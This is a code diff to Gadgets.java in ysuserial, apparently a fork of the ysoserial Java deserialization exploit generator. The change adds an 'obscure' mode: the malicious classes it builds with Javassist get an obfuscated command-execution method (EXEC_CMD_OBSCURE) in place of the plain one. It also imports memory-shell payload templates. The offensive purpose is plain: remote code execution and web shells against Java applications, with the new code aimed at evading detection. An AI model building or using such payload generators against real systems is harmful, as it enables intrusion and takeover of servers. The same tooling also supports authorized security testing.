@@ -3,7 +3,7 @@ package org.su18.ysuserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 import static org.su18.ysuserial.GeneratePayload.IS_INHERIT_ABSTRACT_TRANSLET;
-import static org.su18.ysuserial.GeneratePayload.IS_SHORT;
+import static org.su18.ysuserial.GeneratePayload.IS_OBSCURE;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 
 import java.io.ByteArrayOutputStream;
@@ -181,7 +181,7 @@ public class Gadgets {
 			String time = String.valueOf(System.nanoTime());
 
 			// 如果指定短 payload，则动态创建一个超级短的恶意类
-			if (IS_SHORT) {
+			if (!IS_OBSCURE) {
 				ctClass = pool.makeClass("A" + time);
 				// 创建无参构造方法
 				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
@@ -484,14 +484,19 @@ public class Gadgets {
 	 * @throws Exception 抛出异常
 	 */
 	public static void insertCMD(CtClass ctClass) throws Exception {
-		ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
-		ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
-		ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-		try {
-			ctClass.getDeclaredMethod("getFieldValue");
-		} catch (NotFoundException e) {
-			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+
+		if (IS_OBSCURE) {
+			ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
+			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
+			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+			try {
+				ctClass.getDeclaredMethod("getFieldValue");
+			} catch (NotFoundException e) {
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+			}
+			ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD_OBSCURE), ctClass));
+		} else {
+			ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
 		}
-		ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
 	}
 }
